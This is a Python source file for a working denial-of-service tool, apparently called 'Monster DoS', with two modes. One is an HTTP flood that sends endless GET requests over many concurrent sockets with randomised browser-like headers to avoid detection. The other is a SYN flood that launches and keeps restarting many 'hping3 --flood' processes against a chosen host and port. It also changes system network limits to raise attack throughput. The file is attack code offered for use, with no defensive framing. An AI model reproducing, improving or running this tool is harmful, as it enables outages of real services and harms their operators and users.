###########
# IMPORTS #
###########
import asyncio
import socket
import random
import string
import sys
import ssl
import subprocess
import time
import os
import threading
import shutil
from rich.console import Console

console = Console()

###############
# COUNTERS    #
###############
total_requests = 0
total_errors = 0
lock_counter = threading.Lock()
start_time = 0
running = True
processes = []

##################
# CONFIGURATIONS #
##################
USE_HPING3 = False
NUM_TASKS = 50
TIMEOUT = 3
RECONNECT_DELAY = 0.01

# Mode Choice
try:
    mode_choice = console.input("[yellow]Do you want Manual HTTP (m) or hping3 SYN Flood (h)? [/yellow]")
    mode_choice = mode_choice.strip().lower()
    if mode_choice in ["h", "hping", "hping3"]:
        USE_HPING3 = True
        console.print("[yellow]Using hping3 SYN Flood mode (Fourth Layer).[/yellow]")
        NUM_TASKS = 50
    else:
        USE_HPING3 = False
        console.print("[yellow]Using Manual HTTP mode.[/yellow]")
        NUM_TASKS = 100
        TIMEOUT = 3
        RECONNECT_DELAY = 0.01
except KeyboardInterrupt:
    console.print("[red]Canceled by user.[/red]")
    sys.exit(2)
except Exception as e:
    console.print(f"[red]Error: {e}[/red]")
    sys.exit(1)

######################
# HEADERS (MANUAL)   #
######################
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
]

SEC_CH_UA = [
    '"Chromium";v="150", "Not;A=Brand";v="8"',
    '"Google Chrome";v="150", "Chromium";v="150", "Not;A=Brand";v="8"',
    '"Firefox";v="145"',
]

SEC_CH_UA_PLATFORM = ['"Linux"', '"Windows"', '"macOS"', '"Android"']
SEC_CH_UA_MOBILE = ["?0", "?1"]
ACCEPT_LANGUAGES = ["pt-BR,pt;q=0.9,en;q=0.8", "en-US,en;q=0.9", "pt-BR,pt;q=0.9,en;q=0.8,es;q=0.7"]

HEADER_POOL = []

def build_header(host, port):
    path = f"/?{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}={random.randint(1, 999999)}"
    header = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Connection: keep-alive\r\n"
        "Cache-Control: max-age=0\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n"
        f"Accept-Language: {random.choice(ACCEPT_LANGUAGES)}\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        f"Sec-Ch-Ua: {random.choice(SEC_CH_UA)}\r\n"
        f"Sec-Ch-Ua-Mobile: {random.choice(SEC_CH_UA_MOBILE)}\r\n"
        f"Sec-Ch-Ua-Platform: {random.choice(SEC_CH_UA_PLATFORM)}\r\n"
        "Sec-Fetch-Site: none\r\n"
        "Sec-Fetch-Mode: navigate\r\n"
        "Sec-Fetch-User: ?1\r\n"
        "Sec-Fetch-Dest: document\r\n"
        "\r\n"
    )
    return header

def pre_generate_headers(host, port, size=2000):
    global HEADER_POOL
    HEADER_POOL = [build_header(host, port) for _ in range(size)]

def get_random_header():
    return random.choice(HEADER_POOL)

######################
# MANUAL HTTP ATTACK #
######################
async def manual_attack(host, port, use_ssl=False):
    global total_requests, total_errors
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.settimeout(TIMEOUT)

            if use_ssl:
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=host)

            loop = asyncio.get_event_loop()
            await loop.sock_connect(sock, (host, port))

            while True:
                try:
                    header = get_random_header()
                    await loop.sock_sendall(sock, header.encode())
                    with lock_counter:
                        total_requests += 1
                except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError):
                    with lock_counter:
                        total_errors += 1
                    break
                except socket.timeout:
                    with lock_counter:
                        total_errors += 1
                    break
                except Exception:
                    with lock_counter:
                        total_errors += 1
                    break

            sock.close()
            await asyncio.sleep(RECONNECT_DELAY)

        except asyncio.CancelledError:
            return
        except KeyboardInterrupt:
            return
        except Exception:
            with lock_counter:
                total_errors += 1
            await asyncio.sleep(RECONNECT_DELAY)
            continue

###########################
# HPING3 SYN FLOOD ATTACK #
##########################
def find_hping3():
    hping3_path = shutil.which("hping3")
    if hping3_path is None:
        possible_paths = ["/usr/sbin/hping3", "/usr/bin/hping3", "/sbin/hping3"]
        for path in possible_paths:
            if os.path.exists(path) and os.access(path, os.X_OK):
                hping3_path = path
                break
    if hping3_path is None:
        print("[!] hping3 not found. Install it and try again.")
        sys.exit(1)
    return hping3_path

async def hping3_syn_task(host, port, hping3_path):
    global processes
    cmd = [hping3_path, "-S", "-p", str(port), "--flood", host]
    while True:  # Loop infinito – reinicia se o processo morrer
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            with lock_counter:
                processes.append(proc)
            await proc.wait()
            # Se o processo morreu, reinicia automaticamente
        except asyncio.CancelledError:
            return
        except KeyboardInterrupt:
            return
        except Exception:
            await asyncio.sleep(0.5)
            continue

###########
# DISPLAY #
###########
def update_display(host, port, mode):
    global total_requests, total_errors, start_time, running
    while running:
        elapsed = time.time() - start_time
        with lock_counter:
            req = total_requests
            err = total_errors
        rps = int(req / elapsed) if elapsed > 0 else 0
        os.system('clear' if os.name == 'posix' else 'cls')
        print("=" * 50)
        if mode == "manual":
            print("  Monster DoS Attack Status (HTTP)")
            print("=" * 50)
            print(f"  Host:Port     : {host}:{port}")
            print(f"  Total Requests: {req:,}")
            print(f"  RPS           : {rps:,}")
            print(f"  Errors        : {err:,}")
            print(f"  Uptime (s)    : {int(elapsed)}")
            print(f"  Tasks         : {NUM_TASKS}")
        else:  # hping3 mode
            print("  Monster DoS Attack Status (SYN Flood / hping3)")
            print("=" * 50)
            print(f"  Host:Port     : {host}:{port}")
            print(f"  Uptime (s)    : {int(elapsed)}")
            print(f"  Tasks         : {NUM_TASKS}")
        print("=" * 50)
        print("  [Press Ctrl+C to stop]")
        time.sleep(1)

##############
# MAIN ASYNC #
##############
async def main_attack(host, port, use_ssl):
    global start_time, running, processes
    start_time = time.time()

    if USE_HPING3:
        hping3_path = find_hping3()
        thread = threading.Thread(target=update_display, args=(host, port, "hping3"))
        thread.daemon = True
        thread.start()
        attack_tasks = [asyncio.create_task(hping3_syn_task(host, port, hping3_path)) for _ in range(NUM_TASKS)]
    else:
        pre_generate_headers(host, port)
        thread = threading.Thread(target=update_display, args=(host, port, "manual"))
        thread.daemon = True
        thread.start()
        attack_tasks = [asyncio.create_task(manual_attack(host, port, use_ssl)) for _ in range(NUM_TASKS)]

    try:
        await asyncio.gather(*attack_tasks)
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Exiting immediately...")
        running = False
        with lock_counter:
            for proc in processes:
                try:
                    proc.terminate()
                except:
                    pass
        thread.join(timeout=1)
        sys.exit(0)

##############
# RUNNER     #
##############
def run(host, port, type):
    print(f"[DEBUG] run() called for {host}:{port} (type: {type})")

    if sys.platform.startswith('linux'):
        try:
            subprocess.run("ulimit -n 65535", shell=True, check=False)
            subprocess.run("sysctl -w net.ipv4.ip_local_port_range='1024 65535'", shell=True, check=False, stderr=subprocess.DEVNULL)
            subprocess.run("sysctl -w net.ipv4.tcp_tw_reuse=1", shell=True, check=False, stderr=subprocess.DEVNULL)
        except:
            pass

    use_ssl = type.lower() == "https"

    try:
        asyncio.run(main_attack(host, port, use_ssl))
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(0)
